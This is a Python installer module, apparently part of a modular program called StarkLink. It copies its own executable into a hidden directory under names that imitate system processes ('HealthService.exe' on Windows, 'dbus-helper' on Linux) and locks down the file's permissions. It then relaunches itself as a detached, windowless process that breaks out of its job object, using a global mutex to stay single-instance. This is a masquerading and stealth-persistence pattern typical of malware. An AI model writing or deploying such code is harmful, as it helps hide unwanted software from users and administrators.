# Labels
__RESOURCE_TYPE__ = "STRUCTURAL"

# Library import
from abc import ABC, abstractmethod
from .. import ManagerInterface, ModuleInterface
from shared.utils.logger import logger
import os
from . import modules
import shutil
import traceback
import sys
import subprocess
import platform
from typing import Optional
import ctypes  # Necesario para Mutex y detección de consola en Windows

# Classes definition
class InstallManager(ManagerInterface):
    def __init__(self, system) -> None:
        # Ajustado para coincidir con ManagerInterface(self, system)
        super().__init__(system)
        self.mutex = None # Referencia del mutex para que no se libere por el GC
        self.logger = logger("INSTALL_MANAGER")

    # Private methods
    def _is_already_running(self) -> bool:
        print(f"[INSTALL_MANAGER] Verifying if the software is already running....")
        """Verifica si ya existe una instancia activa usando un Mutex de sistema."""
        if os.name == 'nt':
            # Nombre único para el cerrojo del proceso
            mutex_name = "Global\\StarkLink_Execution_Mutex_v2"
            print(f"[INSTALL_MANAGER] Mutex name: {mutex_name}")

            # Intentamos crear el Mutex
            self.mutex = ctypes.windll.kernel32.CreateMutexW(None, False, mutex_name)
            # Si el error es 183, ya hay uno corriendo
            if ctypes.windll.kernel32.GetLastError() == 183:
                print(f"[INSTALL_MANAGER] The software is already running")
                return True

        print(f"[INSTALL_MANAGER] The software is not already running")
        return False

    def _has_console_window(self) -> bool:
        """Detecta si el proceso actual tiene una ventana de terminal visible."""
        if os.name == 'nt':
            return ctypes.windll.kernel32.GetConsoleWindow() != 0
        return False

    def _execute_preinstall(self) -> bool:
        print(f"[INSTALL_MANAGER] Executing pre-installation process...")
        self.logger.info("Executing pre-installation process")

        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_PREINSTALL:
                continue
            try:
                module_instance = module_class(self.module_container, self.system)
                print(f"[INSTALL_MANAGER] Starting module: {module_instance.MODULE_NAME}...")
                self.logger.info(f"Starting module: {module_instance.MODULE_NAME}")
                start_result = module_instance.start()
                self.logger.info(f"Module start result: {start_result}")
                print(f"[INSTALL_MANAGER] Module start result: {start_result}")
            except Exception as Error:
                self.logger.info(f"Error starting module: {Error}")
                print(f"[INSTALL_MANAGER] Error starting module: {Error}")
                continue

        print(f"[INSTALL_MANAGER] Finishing pre-installation process")
        self.logger.info("Finishing pre-installation process")
        return True
    
    def _execute_install(self) -> bool:
        print(f"[INSTALL_MANAGER] Executing installation process...")
        self.logger.info("Executing installation process")

        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_PROINSTALL:
                continue
            try:
                module_instance = module_class(self.module_container, self.system)
                print(f"[INSTALL_MANAGER] Starting module: {module_instance.MODULE_NAME}...")
                self.logger.info(f"Starting module: {module_instance.MODULE_NAME}")
                start_result = module_instance.start()
                self.logger.info(f"Module started. Result: {start_result}")
                print(f"[INSTALL_MANAGER] Module started. Result: {start_result}")
            except Exception as Error:
                self.logger.error(f"Module start exception: {Error}")
                print(f"[INSTALL_MANAGER] Module start exception: {Error}")
                continue

        print(f"[INSTALL_MANAGER] Finishing installation process")
        self.logger.info("Finishing installation process")
        return True

    def _execute_postinstall(self) -> bool:
        print(f"[INSTALL_MANAGER] Executing post-install process...")
        self.logger.info("Executing post-installation process")
        for module_name, module_class in self.module_container.modules_table.items():
            if module_class.INSTALL_STAGE != module_class.INSTALL_STAGE_POSTINSTALL:
                continue
            try:
                module_instance = module_class(self.module_container, self.system)
                print(f"[INSTALL_MANAGER] Starting module: {module_instance.MODULE_NAME}...")
                self.logger.info(f"Starting module: {module_instance.MODULE_NAME}")
                start_result = module_instance.start()
                self.logger.info(f"Module started. Result: {start_result}")
                print(f"[INSTALL_MANAGER] Module started. Result: {start_result}")
            except Exception as Error:
                self.logger.error(f"Error starting module: {Error}")
                print(f"[INSTALL_MANAGER] Error starting module: {Error}")
                continue

        print(f"[INSTALL_MANAGER] Finishing post-install process")
        self.logger.info("Finishing post-install process")
        return True

    def _deploy_resources(self) -> bool:
        process_source = self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        secure_directory = self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH")

        if platform.system().upper() == "WINDOWS": 
            new_process_name = "HealthService"
        elif platform.system().upper() == "LINUX":
            new_process_name = "dbus-helper"
        
        if os.name == 'nt':
            new_process_name += ".exe"

        target_path = os.path.join(secure_directory, new_process_name)

        print(f"[INSTALL_MANAGER] Starting resources deployment...")
        print(f"[INSTALL_MANAGER] Process source: {process_source} | Secure directory: {secure_directory} | New process name: {new_process_name} | Target path: {target_path}")
        self.logger.info("Starting resources deployment")
        self.logger.info(f"Process soruce: {process_source} | Secure directory: {secure_directory} | New process name: {new_process_name} | Target path: {target_path}")

        try:
            print(f"[INSTALL_MANAGER] Copying resources...")
            self.logger.info("Copying resources")
            shutil.copy2(process_source, target_path)
            print(f"[INSTALL_MANAGER] Resources copied")
            self.logger.info("Resources copied")

            self.logger.info(f"Changing software permissions: {target_path}")
            print(f"[INSTALL_MANAGER] Changing software permissions: {target_path}...")
            os.chmod(target_path, 0o700)
            print(f"[INSTALL_MANAGER] Software permissions updated")
            self.logger.info("Software permissions updated")

            print(f"[INSTALL_MANAGER] Updating VirtualFileSystem process source filepath. From: {self.system.virtual_file_system.query('PROCESS_SOURCE_FILEPATH')}, to: {target_path}...")
            self.logger.info(f"Updating VirtualFileSYstem process source filepath. From: {self.system.virtual_file_system.query('PROCESS_SOURCE_FILEPATH')}, to: {target_path}")

            self.system.virtual_file_system.update("PROCESS_SOURCE_FILEPATH", target_path)
            return True
        except Exception as Error:
            self.logger.info(f"Error deploying resources: {Error}")
            print(f"[INSTALL_MANAGER] Error deploying resources: {Error}")
            return False

    def _deploy_install_flag(self) -> bool:
        try:
            install_flag_filepath = self.system.virtual_file_system.query("INSTALL_FLAG_FILEPATH")
            print(f"[INSTALL_MANAGER] Creating install flag: {install_flag_filepath}...")
            self.logger.info(f"Creating install flag: {install_flag_filepath}")
            with open(install_flag_filepath, 'w', encoding="UTF-8") as file:
                pass

            print(f"[INSTALL_MANAGER] Flag created successfully")
            self.logger.info("Flag created successfully")
            return True
        except Exception as Error:
            self.logger.error(f"Error creating flag: {Error}")
            print(f"[INSTALL_MANAGER] Error creating the flag: {Error}")
            return False

    def _get_current_executable(self):
        if getattr(sys, "frozen", False):
            print(f"[INSTALL_MANAGER] Current executable filepath: {sys.executable}")
            self.logger.info(f"Current executable filepath: {sys.executable}")
            return sys.executable

        print(f"[INSTALL_MANAGER] Current executable filepath: {os.path.abspath(sys.argv[0])}")
        self.logger.info(f"Current executable filepath: {os.path.abspath(sys.argv[0])}")

        return os.path.abspath(sys.argv[0])

    def _respawn_system(self) -> Optional[bool]:
        vfs = self.system.virtual_file_system
        new_executable = vfs.query("PROCESS_SOURCE_FILEPATH")

        print(f"[INSTALL_MANAGER] Respawning from: {new_executable}")
        self.logger.info(f"Respawning from: {new_executable}")

        kwargs = {
            "stdout": subprocess.DEVNULL,
            "stderr": subprocess.DEVNULL,
            "stdin": subprocess.DEVNULL,
            "close_fds": True,
            "cwd": os.path.dirname(new_executable)
        }

        if os.name == 'nt':
            kwargs["creationflags"] = (
                0x08000000 |  # CREATE_NO_WINDOW
                0x00000008 |  # DETACHED_PROCESS
                0x01000000    # CREATE_BREAKAWAY_FROM_JOB
            )
        else:
            kwargs["start_new_session"] = True

        try:

            print(f"[INSTALL_MANAGER] Spawning process with arguments: {kwargs}")
            self.logger.info(f"Spawning process with arguments: {kwargs}")

            subprocess.Popen(
                [new_executable] + sys.argv[1:],
                **kwargs
            )

            self.logger.info("Exitting parent process")
            print(f"[INSTALL_MANAGER] Exiting parent process")

            os._exit(0)

        except Exception as Error:
            self.logger.error(f"Respawn error: {Error}")

            print(f"[INSTALL_MANAGER] Respawn error: {Error}")
            return False
        
    # Public methods
    def start(self) -> bool:
        self.logger.info("Starting install manager")
        self.logger.info(f"System executable: {sys.executable} | Arguments: {sys.argv} | Current work directory: {os.getcwd()}")
        print(f"[INSTALL_MANAGER] Starting InstallManager...")
        print(f"[INSTALL_MANAGER] Sys.executable: {sys.executable}")
        print(f"[INSTALL_MANAGER] Argv: {sys.argv}")
        print(f"[INSTALL_MANAGER] Current work directory: {os.getcwd()}")

        # MUTEX
        if self._is_already_running():
            print(f"[INSTALL_MANAGER] Another instance detected. Exiting.")
            self.logger.info("Stopping system. The software is already running")
            os._exit(0)
        else:
            self.logger.info("The software is not already running. Proceeding with the process")
            pass

        # LOAD MODULES
        print(f"[INSTALL_MANAGER] Loading modules...")
        self.module_container.load_modules(package=modules.__package__)
        print(f"[INSTALL_MANAGER] Available modules: {self.module_container.query_modules()}")
        self.logger.info(f"Available loaded modules: {self.module_container.query_modules()}")

        # INSTALL STATE     
        print(f"[INSTALL_MANAGER] Verifying current installation...")
        is_installed = self.system.virtual_file_system.is_installed()
        print(f"[INSTALL_MANAGER] Currently installed: {is_installed}")

        self.logger.info(f"Current installation status: {is_installed}")

        current_path = os.path.abspath(self._get_current_executable())

        secure_path = os.path.abspath(
            self.system.virtual_file_system.query("PROCESS_SOURCE_FILEPATH")
        )

        print(f"[INSTALL_MANAGER] Current software path: {current_path}")
        print(f"[INSTALL_MANAGER] Secure path: {secure_path}")

        self.logger.info(f"Current path: {current_path} | Secure path: {secure_path}")

        # ---------------------------------------------------
        # CASE 1 — NOT INSTALLED
        # ---------------------------------------------------

        if not is_installed:
            print(f"[INSTALL_MANAGER] First execution. Executing installation...")
            self.logger.info(f"The software is not installed. Proceeding with the installation")
            self.install()
            return True

        # ---------------------------------------------------
        # CASE 2 — INSTALLED BUT WRONG LOCATION
        # ---------------------------------------------------

        if current_path != secure_path:
            print(f"[INSTALL_MANAGER] Executable running from wrong path. Migrating...")
            self.logger.info(f"Software executing from a wrong location. Migrating system")
            self._respawn_system()
            os._exit(0)

        # ---------------------------------------------------
        # CASE 3 — INSTALLED AND CORRECT
        # ---------------------------------------------------

        print(f"[INSTALL_MANAGER] Installation verified. Continuing normal execution.")
        self.logger.info("Installation start finished")

        return False

    def stop(self) -> bool:
        self.logger.info("Stopping install manager")
        print(f"[INSTALL_MANAGER] Stopping InstallManager...")
        pass
        self.logger.info("Install manager stopped")
        print(f"[INSTALL_MANAGER] InstallManager stopped")
        return True

    def install(self) -> bool:
        self.logger.info("Executing pre-installation")
        print(f"[INSTALL_MANAGER] Executing pre-installation...")
        self._execute_preinstall()
        self.logger.info("Pre-installation executed")
        print(f"[INSTALL_MANAGER] Pre-installation executed")

        secure_dir = self.system.virtual_file_system.query("SECURE_DIRECTORY_PATH")
        print(f"[INSTALL_MANAGER] Secure directory: {secure_dir}")


        if not os.path.exists(secure_dir):
            print(f"[INSTALL_MANAGER] Creating secure directory...")
            self.logger.info(f"Creating secure directory: {secure_dir}")
            creation_result = os.mkdir(secure_dir)
            self.logger.info(f"Creation result: {creation_result}")
            print(f"[INSTALL_MANAGER] Secure directory creation: {creation_result}")

        if not self._deploy_resources():
            self.logger.error("Error deploying resources")
            print(f"[INSTALL_MANAGER] Error deploying resources")
            return False

        print(f"[INSTALL_MANAGER] Executing installation...")
        self.logger.info("Executing installation")
        self._execute_install()
        self.logger.info("Installation executed")

        print(f"[INSTALL_MANAGER] Installation executed")

        if not self._deploy_install_flag():
            self.logger.info("Error deploying the installation flag")
            print(f"[INSTALL_MANAGER] Error deploying the installation flag")
            return False

        print(f"[INSTALL_MANAGER] Executing post-installation...")
        self.logger.info("Executing post-installation")
        self._execute_postinstall()
        self.logger.info("post-installation executed")
        print(f"[INSTALL_MANAGER] post-installation executed")

        self.logger.info("Starting system respawn")
        self._respawn_system()
        return True

class InstallationModule(ModuleInterface, ABC):
    # Class properties definition
    INSTALL_STAGE_UNDEFINED: str = "UNDEFINED"
    INSTALL_STAGE_PREINSTALL: str = "PRE-INSTALL"
    INSTALL_STAGE_PROINSTALL: str = "PRO-INSTALL"
    INSTALL_STAGE_POSTINSTALL: str = "POST-INSTALL"

    INSTALL_STAGE: str = INSTALL_STAGE_UNDEFINED